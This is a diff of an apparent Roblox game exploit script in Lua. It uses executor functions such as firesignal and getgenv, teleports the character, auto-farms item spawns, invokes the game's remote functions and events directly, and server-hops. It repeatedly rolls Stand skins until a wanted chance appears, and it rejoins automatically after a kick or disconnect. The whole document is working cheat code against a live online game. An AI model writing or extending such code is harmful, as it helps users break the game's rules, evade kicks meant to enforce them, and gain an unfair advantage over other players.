     if (game.Players.LocalPlayer.PlayerGui:FindFirstChild("Message") and game.Players.LocalPlayer.PlayerGui.Message:FindFirstChild("TextLabel")) and val and (val.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 5 then
-        if string.match(lp.PlayerGui.Message.TextLabel.Text, "Rib Cage of The Saint's Corpse") then
-            table.remove(nuvreau, 1)
-        print("Removed".. val.MeshId)
-        while wait() do
-                                        hop()
-        end
-        elseif string.find(lp.PlayerGui.Message.TextLabel.Text, "Rokakaka") and not string.find(lp.PlayerGui.Message.TextLabel.Text, "Pure") then
-            table.remove(nuvreau, 2)
-        print("Removed"..val.MeshId)
-        while wait() do
-                                        hop()
-        end
-        end
-            b:Destroy()
+        if string.match(lp.PlayerGui.Message.TextLabel.Text, "You can't have more than") then
+            print("You can't have more")
+            b:Destroy();
         end
     end
     end
-end
-end
-end
-end
-end
-end
-            
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
     
     
     
     
-local function nufrate()
-    print("colo")
-    while wait() do
-            
-        if #workspace.Item_Spawns.Items:GetChildren() == 0 then
-            repeat wait(0.60) 
+task.spawn(function() pcall(function()
+game:GetService("CoreGui").DescendantAdded:Connect(function(child) 
+    if child.Name == "ErrorPrompt" then 
+        local GrabError = child:FindFirstChild("ErrorMessage",true)
+        repeat wait() until GrabError.Text ~= "Label" 
+        local Reason = GrabError.Text 
+        if Reason:match("kick") or Reason:match("You") or Reason:match("conn") or Reason:match("rejoin") or Reason:match("Reconnect") then
+            rasa(Reason, "")
+                 wait(1)
+         game:GetService("TeleportService"):Teleport(2809202155, game:GetService("Players").LocalPlayer)
+        end 
+    end 
+end ) 
+end ) 
+end )
+
+while wait() do
+    
+        if #workspace.Item_Spawns.Items:GetChildren() == 0 and workspace:FindFirstChild("Para")then
+            repeat wait()
                 
 
-                mata()
+                mata() 
             
-            until #game:GetService("Workspace")["Item_Spawns"].Items:GetChildren() > 0 
+            until #game:GetService("Workspace")["Item_Spawns"].Items:GetChildren() > 0 or workspace:FindFirstChild("Para")==nil
         end
-        
-        if #game:GetService("Workspace")["Item_Spawns"].Items:GetChildren() > 0  then
-
     for i,aga in pairs(workspace.Item_Spawns.Items:GetChildren()) do
         if aga:IsA("Model") then
     for i2,aga2 in pairs(aga:GetChildren()) do
@@ -597,170 +717,22 @@ local function nufrate()
             
             if aga2.Transparency == 1 or aga2.MeshId ~= v then
                 wait(0.25)
-mata()
+                mata()
+                
+
 
           
             elseif aga2.MeshId == v and aga2.Transparency~= 1 then
     
 break
 end
-end
     tactu()
-
-end
-end
-end
-end
-end
-end
-end
-
-local function haim()
-while wait() do
     
-    lp.Character.RemoteFunction:InvokeServer(learnskill, tablaskill)
-
-end
-end
-
-local function haima()
-
-    lp.Character.Head:Destroy()
-
-
-    workspace.Living.ChildAdded:connect(function(a)
-        if a.Name == game.Players.LocalPlayer.Name then
-            game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop").Visible = false
-             wait(1.55)
-
-            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames:WaitForChild("Store"):WaitForChild("ToggleStandShop"):WaitForChild("Button").MouseButton1Click)
-            game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop").Visible = false
-lpcf = CFrame.new(19.791584014892578, -42.00715255737305, -1212.7635498046875)
-game:GetService("CoreGui").Bine11.Enabled = true
-
-
-if lp.PlayerStats.Stand.Value ~= "None" then
-    
-    lp.Character:WaitForChild("RemoteFunction"):InvokeServer(activstand, standac)
-
-end
-print('acumm')
-local Finished = false
-    repeat task.wait()
-        firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames:WaitForChild("Store"):WaitForChild("ToggleStandShop"):WaitForChild("Button").MouseButton1Click)
-        game:GetService("CoreGui").Bine11.nana.Text = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop"):WaitForChild("SkinChances1").Text
-
-    local Children = {}
-    for _, Obj in pairs(game.Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
-        if Obj.Name == ("Rib Cage of The Saint's Corpse") then
-            table.insert(Children, Obj)
-        if workspace:FindFirstChild("Arrow") then workspace.Arrow.Value = #Children
-end
-    end
-end
-    
-        lp.Character:WaitForChild("RemoteFunction"):InvokeServer(learnskill, tablaskill)
-            if lp["PlayerStats"].Stand.Value == ("None") then
-                print("ain")
-                
-
-                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1737.0465087890625, -42.090232849121094, -1576.7703857421875)
-                
-                print("1")
-                if lp:WaitForChild("Backpack"):WaitForChild("Rib Cage of The Saint's Corpse") then
-                    print("arro")
-                    lp.Backpack:WaitForChild("Rib Cage of The Saint's Corpse").Parent = lp.Character
-                    print("gotaro")
-    lp.Character:WaitForChild("Rib Cage of The Saint's Corpse"):Activate()
-                print("actiaro")
-
-
-local nuuu = "EndDialogue"
-local daaa = {
-	["NPC"] = "Rib Cage of The Saint's Corpse",
-	["Option"] = "Option1",
-	["Dialogue"] = "Dialogue2"
-}
-
-game.Players.LocalPlayer.Character.RemoteEvent:FireServer(nuuu, daaa)
-end
-for i,v in pairs(lp.Character:GetChildren()) do
-    if v:IsA("Tool") then v.Parent = lp.Backpack
-     end
-end
-
-if getgenv().AutoClick == true then
-
-    mouse1click()
-    mouse1click()
     
 end
 end
-
-repeat wait() until lp["PlayerStats"].Stand.Value ~= "None"
-print("a")
-
-
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1737.0465087890625, -42.090232849121094, -1576.7703857421875)
-    
-firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames:WaitForChild("Store"):WaitForChild("ToggleStandShop"):WaitForChild("Button").MouseButton1Click)
-        if game.Players.LocalPlayer.Character:FindFirstChild("StandMorph")==nil then
-            game.Players.LocalPlayer.Character.RemoteFunction:InvokeServer(activstand, standac)
-        
-        end
-
---game:GetService("Workspace").Living.Zieme91676.StandMorph.StandSkin.Value
-
-    if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop"):WaitForChild("SkinChances1").Text ~= "4%" or game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop"):WaitForChild("SkinChances1").Text ~= "4.2%" then
-            
-        local nuuu = "EndDialogue"
-        local daaa = {
-            ["NPC"] = "Rib Cage of The Saint's Corpse",
-            ["Option"] = "Option1",
-            ["Dialogue"] = "Dialogue2"
-        }
-        
-        game.Players.LocalPlayer.Character.RemoteEvent:FireServer(nuuu, daaa)
-
-        print("plizz")
-        firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames:WaitForChild("Store"):WaitForChild("ToggleStandShop"):WaitForChild("Button").MouseButton1Click)
-
-        
-
-for i,v in pairs(lp.Character:GetChildren()) do
-            if v:IsA("Tool") then v.Parent = lp.Backpack
-             end
-        end
-if getgenv().AutoClick == true then
-
-    mouse1click()
-    mouse1click()
-    
 end
 end
-
-
-
-until workspace.Arrow.Value <= 1 or game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HUD"):WaitForChild("Main"):WaitForChild("Frames"):WaitForChild("StandShop"):WaitForChild("SkinChances1").Text == (getgenv().PityWanted)
-
-
-print('haicoae')
-while wait(4) do
-    
-hop()
 end
 end
-
-
-
-end)
-end
-if workspace:FindFirstChild("nuvr")==nil then
-    print('nunu')
-        nufrate()
-end
-
-
-if workspace:FindFirstChild("nuvr") then
-    haima()
 end
